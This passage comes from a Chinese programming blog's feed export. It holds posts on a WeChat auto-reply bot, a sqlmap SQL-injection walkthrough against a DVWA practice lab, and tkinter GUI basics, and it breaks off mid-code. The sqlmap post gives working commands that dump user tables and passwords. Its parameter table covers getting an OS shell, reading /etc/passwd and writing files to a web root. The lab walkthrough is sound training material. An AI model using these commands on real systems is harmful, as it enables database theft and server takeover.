<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8000/myapi/add/&quot;, json=&#123;&quot;name&quot;: &quot;admin1&quot;, &quot;tel&quot;: &quot;123456&quot;&#125;)</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/25867e8/image-20221209200159234.png" alt="image-20221209200159234"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>mysql</tag>
        <tag>sqlite</tag>
      </tags>
  </entry>
  <entry>
    <title>python操作微信机器人自动回复</title>
    <url>/aposts/f95c9694/</url>
    <content><![CDATA[<h2 id="运行下面的代码，可以自动给指定的微信好友发消息"><a href="#运行下面的代码，可以自动给指定的微信好友发消息" class="headerlink" title="运行下面的代码，可以自动给指定的微信好友发消息"></a>运行下面的代码，可以自动给指定的微信好友发消息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import itchat</span><br><span class="line"></span><br><span class="line">#产生二维码</span><br><span class="line">itchat.auto_login(hotReload=True)</span><br><span class="line">#定义用户的昵称</span><br><span class="line">send_userid=&#x27;亲爱的&#x27;</span><br><span class="line">#查找用户的userid</span><br><span class="line">itcaht_user_name = itchat.search_friends(name=send_userid)[0][&#x27;UserName&#x27;]</span><br><span class="line">#利用send_msg发送消息</span><br><span class="line">itchat.send_msg(&#x27;这是一个测试&#x27;,toUserName=itcaht_user_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="运行下面的代码，好友发消息给你后自动回复"><a href="#运行下面的代码，好友发消息给你后自动回复" class="headerlink" title="运行下面的代码，好友发消息给你后自动回复"></a>运行下面的代码，好友发消息给你后自动回复</h2><ul>
<li>自动回复的内容用的是图灵机器人</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import itchat</span><br><span class="line"># 去图灵机器人官网注册后会生成一个apikey，可在个人中心查看</span><br><span class="line">KEY = &#x27;8edce3ce905a4c1dbb96**************&#x27;</span><br><span class="line">def get_response(msg):</span><br><span class="line">    apiUrl = &#x27;http://www.tuling123.com/openapi/api&#x27;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;key&#x27;   : KEY,</span><br><span class="line">        &#x27;info&#x27;   : msg,   # 这是要发送出去的信息</span><br><span class="line">        &#x27;userid&#x27;  : &#x27;wechat-rebot&#x27;,  #这里随意写点什么都行</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        # 发送一个post请求</span><br><span class="line">        r = requests.post(apiUrl, data =data).json()</span><br><span class="line">        # 获取文本信息，若没有‘Text’ 值，将返回Nonoe </span><br><span class="line">        return r.get(&#x27;text&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        return</span><br><span class="line"># 通过定义装饰器加强函数 tuling_reply(msg) 功能，获取注册文本信息</span><br><span class="line">@itchat.msg_register(itchat.content.TEXT)</span><br><span class="line">def tuling_reply(msg):</span><br><span class="line">    # 设置一个默认回复，在出现问题仍能正常回复信息</span><br><span class="line">    defaultReply = &#x27;I received: &#x27; +msg[&#x27;Text&#x27;]</span><br><span class="line">    reply = get_response(msg[&#x27;Text&#x27;])</span><br><span class="line">    # a or b 表示，如有a有内容，那么返回a，否则返回b</span><br><span class="line">    return reply or defaultReply</span><br><span class="line"># 使用热启动，不需要多次扫码</span><br><span class="line">itchat.auto_login(hotReload=True)</span><br><span class="line">itchat.run()</span><br></pre></td></tr></table></figure>
<ul>
<li><p>代码来自：<a href="https://blog.csdn.net/zt7524/article/details/81746441">itchat–使用python实现与图灵机器人交互</a></p>
</li>
<li><p>注意图灵机器人的免费个人账号的限制</p>
</li>
</ul>
<p><img src="/aposts/f95c9694/weixin.png"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><a href="https://itchat.readthedocs.io/zh/latest/">微信itchat文档</a></li>
<li><a href="https://www.cnblogs.com/jmmchina/p/6692149.html">Python微信库:itchat</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>sqlmap实践</title>
    <url>/aposts/e20c296e/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>sqlmap 是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过带外数据连接的方式执行操作系统命令。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li>下载最新源码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure>

<ul>
<li>使用方法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\app\sqlmap-dev&gt;python -V</span><br><span class="line">Python 3.7.9</span><br><span class="line"></span><br><span class="line">E:\app\sqlmap-dev&gt;python sqlmap.py -h</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.6.2.4#dev&#125;</span><br><span class="line">|_ -| . [,]     | .&#x27;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">Usage: sqlmap.py [options]</span><br></pre></td></tr></table></figure>

<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><ul>
<li><p>之前的文章写过了<a href="https://moon-full.gitee.io/2022/02/10/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-SQL-Injection-sql%E6%B3%A8%E5%85%A5/">DVWA通关指南-SQL-Injection-sql注入</a>，本次采用sqlmap来实践</p>
</li>
<li><p>dwva 安全等级设置为low，在sql注入界面输入1，点击提交</p>
<ul>
<li>把cookie拷贝：<code>security=low; PHPSESSID=aldgnbndvch51dlisl97mvp1n4</code></li>
<li>得到发送请求的url：<a href="http://xxxxxx/DVWA-2.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit">http://xxxxxx/DVWA-2.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit</a></li>
</ul>
</li>
</ul>
<p><img src="/aposts/e20c296e/image-20220218093732636.png" alt="image-20220218093732636"></p>
<h3 id="默认注入"><a href="#默认注入" class="headerlink" title="默认注入"></a>默认注入</h3><p>我们要以刚才发现的 ?id 为突破点，使用sqlmap 对DVWA 进行sql 注入测试，batch参数表示默认选项</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">E:\app\sqlmap-dev&gt;python sqlmap.py -u <span class="string">&quot;http://IpAddress/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;security=low; PHPSESSID=aldgnbndvch51dlisl97mvp1n4&quot;</span> --batch</span><br></pre></td></tr></table></figure>

<p><strong>发现了4个注入漏洞类型（基于布尔的盲注检测，时间的盲注检测，错误的检测，union联合查询的检测）；还有一种sqlmap也支持就是堆叠查询的检测，其实就算多语句查询，多语句用;隔开</strong></p>
<p><img src="/aposts/e20c296e/image-20220218111128496.png" alt="image-20220218111128496"></p>
<h3 id="拿数据库"><a href="#拿数据库" class="headerlink" title="拿数据库"></a>拿数据库</h3><p>拿数据库信息的命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">E:\app\sqlmap-dev&gt;python sqlmap.py -u <span class="string">&quot;http://IpAddress/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;security=low; PHPSESSID=aldgnbndvch51dlisl97mvp1n4&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p>扫描出来了两个数据库</p>
<p><img src="/aposts/e20c296e/image-20220218111344952.png" alt="image-20220218111344952"></p>
<h3 id="拿表"><a href="#拿表" class="headerlink" title="拿表"></a>拿表</h3><p>查看某数据库并展示所有表命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\app\sqlmap-dev&gt;python sqlmap.py -u &quot;http://IpAddress/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=aldgnbndvch51dlisl97mvp1n4&quot; --batch -D dvwa --tables</span><br></pre></td></tr></table></figure>

<p>得到了两个表</p>
<p><img src="/aposts/e20c296e/image-20220218111657352.png" alt="image-20220218111657352"></p>
<h3 id="表中列"><a href="#表中列" class="headerlink" title="表中列"></a>表中列</h3><p>查看某数据库某表的所有列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\app\sqlmap-dev&gt;python sqlmap.py -u &quot;http://IpAddress/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=aldgnbndvch51dlisl97mvp1n4&quot; --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>

<p>得到了列数据由8个</p>
<p><img src="/aposts/e20c296e/image-20220218112135587.png" alt="image-20220218112135587"></p>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\app\sqlmap-dev&gt;python sqlmap.py -u &quot;http://IpAddress/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=aldgnbndvch51dlisl97mvp1n4&quot; --batch --dump -C &quot;user_id,user,password&quot; -T &quot;users&quot; -D &quot;dvwa&quot;</span><br><span class="line"></span><br><span class="line"># --dump 转储数据库表项,查询字段值</span><br><span class="line"># -C 要进行枚举的指定列名</span><br><span class="line"># -T 要进行枚举的指定表名</span><br><span class="line"># -D 要进行枚举的指定数据库名</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/e20c296e/image-20220218112805713.png" alt="image-20220218112805713"></p>
<p>密码被自动解密了</p>
<h2 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h2><table>
<thead>
<tr>
<th>参数名</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>–data</td>
<td>提交的时候要携带的参数</td>
<td>sqlmap.py -u URL –data“username&#x3D;a&amp;password&#x3D;a”</td>
</tr>
<tr>
<td>–dbms</td>
<td>指定注入的数据类型</td>
<td>–dbms mysql</td>
</tr>
<tr>
<td>–threads</td>
<td>多线程，默认是单线程为1</td>
<td>–threads&#x3D;10</td>
</tr>
<tr>
<td>-r</td>
<td>post数据包</td>
<td>sqlmap -r a.txt -p username 入txtpost数据包参数username进行注入</td>
</tr>
<tr>
<td>–sql-shell</td>
<td>接获取一个sql shell</td>
<td>sqlmap -u url?id＝11 –sql-shell</td>
</tr>
<tr>
<td>–os-shell</td>
<td>获取一个cmd shell</td>
<td>sqlmap -u url?id＝11 -os-cmd&#x3D;ipconfig</td>
</tr>
<tr>
<td>–file-read</td>
<td>读取服务器文件</td>
<td>sqlmap -u <a href="http://url/?id%EF%BC%9D11">http://url?id＝11</a> –file-read&#x3D;&#x2F;etc&#x2F;passwd</td>
</tr>
<tr>
<td>–file-write</td>
<td>写入本地文件到服务器</td>
<td>qlmap -u <a href="http://url/sql.php?id%EF%BC%9D11">http://url/sql.php?id＝11</a> –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</td>
</tr>
</tbody></table>
<ul>
<li>更多参数说明可以参考<a href="https://blog.csdn.net/u011781521/article/details/53979998?spm=1001.2101.3001.6650.14&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-14.queryctrv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-14.queryctrv2&utm_relevant_index=17">这里</a></li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>tkinter学习</title>
    <url>/aposts/6df9a046/</url>
    <content><![CDATA[<ul>
<li>本文主要来源于<a href="https://blog.csdn.net/weixin_44634704/article/details/122571178">这里</a></li>
</ul>
<h2 id="常用组件汇总"><a href="#常用组件汇总" class="headerlink" title="常用组件汇总"></a>常用组件汇总</h2><ul>
<li>看如下代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(<span class="string">&#x27;我的gui程序&#x27;</span>)</span><br><span class="line">root.geometry(<span class="string">&#x27;500x300+100+200&#x27;</span>)</span><br><span class="line"><span class="comment"># 500宽度  300高度   距屏幕左侧100像素 顶部200像素</span></span><br><span class="line">bt = Button(root)</span><br><span class="line">bt[<span class="string">&#x27;text&#x27;</span>] = <span class="string">&#x27;点我&#x27;</span></span><br><span class="line">bt.pack()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">click</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    messagebox.showinfo(<span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;give flower&#x27;</span>)  <span class="comment"># 提示框</span></span><br><span class="line">    </span><br><span class="line">bt.bind(<span class="string">&#x27;&lt;Button-1&gt;&#x27;</span>, click)  <span class="comment"># 绑定点击事件</span></span><br><span class="line">root.mainloop()  <span class="comment"># 进入事件循环</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看<code>root = Tk()</code>，查看源码，发现其实就是实例化<code>class Tk(Misc, Wm)</code>，发现注释中写明了是<code>Base class</code>，经过搜索发现了6个基类，这6个基类包含了常见的组件</li>
</ul>
<p><img src="/aposts/6df9a046/image-20230517161613275.png" alt="image-20230517161613275"></p>
<ul>
<li>组件汇总如下</li>
</ul>
<p><img src="/aposts/6df9a046/image-20230517161741836.png" alt="image-20230517161741836"></p>
<p><img src="/aposts/6df9a046/image-20230517161833878.png" alt="image-20230517161833878"></p>
<h3 id="面向对象写法"><a href="#面向对象写法" class="headerlink" title="面向对象写法"></a>面向对象写法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from tkinter import messagebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Application(Frame):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    继承Frame容器类</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def __init__(self, master=None):</span><br><span class="line">        super().__init__(master)</span><br><span class="line">        self.master = master</span><br><span class="line">        self.pack()</span><br><span class="line"></span><br><span class="line">        self.createWidget()</span><br><span class="line"></span><br><span class="line">    def createWidget(self):</span><br><span class="line">        # 创建组件</span><br><span class="line">        self.btn01 = Button(self)</span><br><span class="line">        self.btn01[&#x27;text&#x27;] = &#x27;点击送花&#x27;</span><br><span class="line">        self.btn01.pack()</span><br><span class="line">        self.btn01[&#x27;command&#x27;] = self.songhua</span><br><span class="line">        # 创建一个退出按钮</span><br><span class="line">        self.btnQuit = Button(self, text=&#x27;退出&#x27;, command=root.destroy)</span><br><span class="line">        self.btnQuit.pack()</span><br><span class="line"></span><br><span class="line">    def songhua(self):</span><br><span class="line">        messagebox.showinfo(&#x27;送花&#x27;, &#x27;送你99朵玫瑰花&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.geometry(&#x27;400x100+200+300&#x27;)</span><br><span class="line">root.title(&#x27;一个经典的GUI程序类的测试&#x27;)</span><br><span class="line">app = Application(master=root)</span><br><span class="line">root.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="常见组件用法"><a href="#常见组件用法" class="headerlink" title="常见组件用法"></a>常见组件用法</h3><h4 id="label"><a href="#label" class="headerlink" title="label"></a>label</h4><ul>
<li><p>主要用于显示文本信息，也可以显示图像，常见属性如下</p>
</li>
<li><p><code>width,height</code><br>用于指定区域大小，如果显示是文本，则以单个英文字符大小为单位(一个汉字宽度占 2 个字符位置，高度和英文字符一样)；如果显示是图像，则以像素为单位。默认值是根据具体显示的内容动态调整。</p>
</li>
<li><p><code>font</code><br>指定字体和字体大小，如：font &#x3D;(font_name,size)</p>
</li>
<li><p><code>image</code><br>显示在 Label 上的图像，目前 tkinter 只支持 gif 格式。</p>
</li>
<li><p><code>fg</code> 和 <code>bg</code><br><code>fg（foreground</code>）:前景色、<code>bg（background）</code>:背景色</p>
</li>
<li><p><code>justify</code><br>针对多行文字的对齐，可设置 justify 属性，可选值”left” “center” “right”</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Application</span>(<span class="title class_ inherited__">Frame</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        self.master = master</span><br><span class="line">        self.pack()</span><br><span class="line">        self.createWidget()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">createWidget</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建组件</span></span><br><span class="line">        self.label01 = Label(self, text=<span class="string">&#x27;关关雎鸠&#x27;</span>, width=<span class="number">10</span>, height=<span class="number">2</span>,</span><br><span class="line">                             bg=<span class="string">&#x27;black&#x27;</span>, fg=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        self.label01.pack() <span class="comment"># self.label01.pack(side=TOP)</span></span><br><span class="line">        self.label02 = Label(self, text=<span class="string">&#x27;hebut&#x27;</span>, width=<span class="number">10</span>, height=<span class="number">2</span>,</span><br><span class="line">                             bg=<span class="string">&#x27;blue&#x27;</span>, fg=<span class="string">&#x27;white&#x27;</span>, font=(<span class="string">&#x27;黑体&#x27;</span>, <span class="number">30</span>))</span><br><span class="line">        self.label02.pack()</span><br><span class="line">        <span class="comment"># 显示图像</span></span><br><span class="line">        <span class="keyword">global</span> photo</span><br><span class="line">        <span class="comment"># photo = PhotoImage(file=&#x27;pic01.gif&#x27;)</span></span><br><span class="line">        <span class="comment"># self.label03 = Label(self, image=photo)</span></span><br><span class="line">        <span class="comment"># self.label03.pack()</span></span><br><span class="line">        <span class="comment"># 显示多行文本</span></span><br><span class="line">        self.label04 = Label(self, text=<span class="string">&#x27;hebut\n关关雎鸠&#x27;</span>, borderwidth=<span class="number">1</span>, relief=<span class="string">&#x27;groove&#x27;</span>, justify=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">        self.label04.pack()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    root = Tk()</span><br><span class="line">    root.geometry(<span class="string">&#x27;400x500+200+300&#x27;</span>)</span><br><span class="line">    app = Application(master=root)</span><br><span class="line">    root.mainloop()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上述例子中，注意pack()的用法，是tkinter中一种布局管理的方法，文章后面介绍了三种布局</p>
</blockquote>
<p><img src="/aposts/6df9a046/image-20230518093353160.png" alt="image-20230518093353160"></p>
<h4 id="options"><a href="#options" class="headerlink" title="options"></a>options</h4><p>我们可以通过 Options 设置组件的属性，从而控制组件的各种状态。比如：宽度、高度、颜色、位置等等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Application</span>(<span class="title class_ inherited__">Frame</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        self.master = master</span><br><span class="line">        self.pack()</span><br><span class="line">        self.createWidget()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">createWidget</span>(<span class="params">self</span>):</span><br><span class="line">        fred = Label(self, text=<span class="string">&#x27;什么？&#x27;</span>, fg=<span class="string">&quot;red&quot;</span>, bg=<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">        fred[<span class="string">&quot;fg&quot;</span>] = <span class="string">&quot;red&quot;</span></span><br><span class="line">        fred[<span class="string">&quot;bg&quot;</span>] = <span class="string">&quot;blue&quot;</span></span><br><span class="line">        fred.config(fg=<span class="string">&quot;white&quot;</span>, bg=<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">        fred.pack()</span><br><span class="line"></span><br><span class="line">        self.btn01 = Button(self, text=<span class="string">&quot;点击送花,变色&quot;</span>)</span><br><span class="line">        <span class="comment"># self.btn01.pack()</span></span><br><span class="line">        self.btn01[<span class="string">&quot;command&quot;</span>] = self.click()</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">click</span>(<span class="params">self</span>):</span><br><span class="line">        messagebox.showinfo(<span class="string">&quot;送花&quot;</span>,<span class="string">&quot;送你99朵花&quot;</span>)</span><br><span class="line">        self.btn01.config(fg=<span class="string">&quot;white&quot;</span>, bg=<span class="string">&quot;black&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(self.btn01.config()) <span class="comment"># 查看 Options 选项的方法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>print(self.btn01.config())</code> 可查看到options中的常用方法</p>
<h4 id="Button-Entry"><a href="#Button-Entry" class="headerlink" title="Button-Entry"></a>Button-Entry</h4><ul>
<li>Button（按钮）用来执行用户的单击操作。Button 可以包含文本，也可以包含图像。按钮被单击后会自动调用对应事件绑定的方法。</li>
<li>Entry，是单行文本框</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Application</span>(<span class="title class_ inherited__">Frame</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master=<span class="literal">None</span></span>):  <span class="comment"># super()代表的是父类的定义，而不是父类对象</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        self.master = master</span><br><span class="line">        self.pack()</span><br><span class="line">        self.createWidget()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">createWidget</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建登录界面的组件</span></span><br><span class="line">        self.label01 = Label(self, text=<span class="string">&quot;用户名&quot;</span>)</span><br><span class="line">        self.label01.pack()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># StringVar 变量绑定到指定的组件。</span></span><br><span class="line">        <span class="comment"># StringVar 变量的值发生变化，组件内容也变化；</span></span><br><span class="line">        <span class="comment"># 组件内容发生变化，StringVar 变量的值也发生变化。 v1 = StringVar()</span></span><br><span class="line">        v1 = StringVar()</span><br><span class="line">        self.entry01 = Entry(self, textvariable=v1)</span><br><span class="line">        self.entry01.pack()</span><br><span class="line">        v1.<span class="built_in">set</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(v1.get())</span><br><span class="line">        <span class="built_in">print</span>(self.entry01.get())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建密码框</span></span><br><span class="line">        self.label02 = Label(self, text=<span class="string">&quot;密码&quot;</span>)</span><br><span class="line">        self.label02.pack()</span><br><span class="line"></span><br><span class="line">        v2 = StringVar()</span><br><span class="line">        self.entry02 = Entry(self, textvariable=v2, show=<span class="string">&quot;*&quot;</span>)</span><br><span class="line">        self.entry02.pack()</span><br><span class="line"></span><br><span class="line">        Button(self, text=<span class="string">&quot;登陆&quot;</span>, command=self.login).pack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        username = self.entry01.get()</span><br><span class="line">        pwd = self.entry02.get()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;去数据库比对用户名和密码！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户名：&quot;</span> + username)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码：&quot;</span> + pwd)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;关关雎鸠&quot;</span> <span class="keyword">and</span> pwd == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;学习系统&quot;</span>, <span class="string">&quot;登录成功！欢迎开始学习！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;学习系统&quot;</span>, <span class="string">&quot;登录失败！用户名或密码错误！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    root = Tk()</span><br><span class="line">    root.geometry(<span class="string">&quot;400x130+200+300&quot;</span>)</span><br><span class="line">    app = Application(master=root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>常见的组件比如Text多行文本框、Radiobutton 单选按钮、Checkbutton 复选按钮、canvas 画布等不做演示</li>
</ul>
<h2 id="布局管理"><a href="#布局管理" class="headerlink" title="布局管理"></a>布局管理</h2><p><code>tkinter</code> 提供了三种管理器：<code>pack、grid、place</code>。</p>
<h3 id="grid-布局管理器"><a href="#grid-布局管理器" class="headerlink" title="grid 布局管理器"></a>grid 布局管理器</h3><p>grid 表格布局，采用表格结构组织组件。子组件的位置由行和列的单元格来确定，并且可以跨行和跨列，从而实现复杂的布局。</p>
<p><img src="/aposts/6df9a046/image-20230518094805637.png" alt="image-20230518094805637"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试 Grid 布局管理器的基本用法，使用面向对象的方式</span></span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Application</span>(<span class="title class_ inherited__">Frame</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># super()代表的是父类的定义，而不是父类对象</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        self.master = master</span><br><span class="line">        self.pack()</span><br><span class="line">        self.createWidget()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">createWidget</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 通过 grid 布局实现登录界面</span></span><br><span class="line">        Label(self,text=<span class="string">&quot;用户名&quot;</span>).grid(row=<span class="number">0</span>,column=<span class="number">0</span>)</span><br><span class="line">        Entry(self).grid(row=<span class="number">0</span>,column=<span class="number">1</span>)</span><br><span class="line">        Label(self,text=<span class="string">&quot;用户名为手机号&quot;</span>).grid(row=<span class="number">0</span>,column=<span class="number">2</span>)</span><br><span class="line">        Label(self, text=<span class="string">&quot;密码&quot;</span>).grid(row=<span class="number">1</span>, column=<span class="number">0</span>)</span><br><span class="line">        Entry(self, show=<span class="string">&quot;*&quot;</span>).grid(row=<span class="number">1</span>, column=<span class="number">1</span>)</span><br><span class="line">        Button(self, text=<span class="string">&quot;登录&quot;</span>).grid(row=<span class="number">2</span>, column=<span class="number">1</span>, sticky=EW)</span><br><span class="line">        Button(self, text=<span class="string">&quot;取消&quot;</span>).grid(row=<span class="number">2</span>, column=<span class="number">2</span>, sticky=EW)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    root = Tk()</span><br><span class="line">    root.geometry(<span class="string">&quot;400x90+200+300&quot;</span>)</span><br><span class="line">    app = Application(master=root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/aposts/6df9a046/image-20230518100007136.png" alt="image-20230518100007136"></p>
<h3 id="pack布局"><a href="#pack布局" class="headerlink" title="pack布局"></a>pack布局</h3><ul>
<li>三种布局中最简单的</li>
<li>pack 按照组件的创建顺序将子组件添加到父组件中，按照垂直或者水平的方向自然排布。如果不指定任何选项，默认在父组件中自顶向下垂直添加组件。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试 pack 布局管理</span></span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.geometry(<span class="string">&quot;700x220&quot;</span>)</span><br><span class="line"><span class="comment"># Frame 是一个矩形区域，就是用来防止其他子组件</span></span><br><span class="line">f1 = Frame(root)</span><br><span class="line">f1.pack()</span><br><span class="line">f2 = Frame(root)</span><br><span class="line">f2.pack()</span><br><span class="line">btnText = (<span class="string">&quot;流行风&quot;</span>, <span class="string">&quot;中国风&quot;</span>, <span class="string">&quot;日本风&quot;</span>, <span class="string">&quot;重金属&quot;</span>, <span class="string">&quot;轻音乐&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> txt <span class="keyword">in</span> btnText:</span><br><span class="line">    Button(f1, text=txt).pack(side=<span 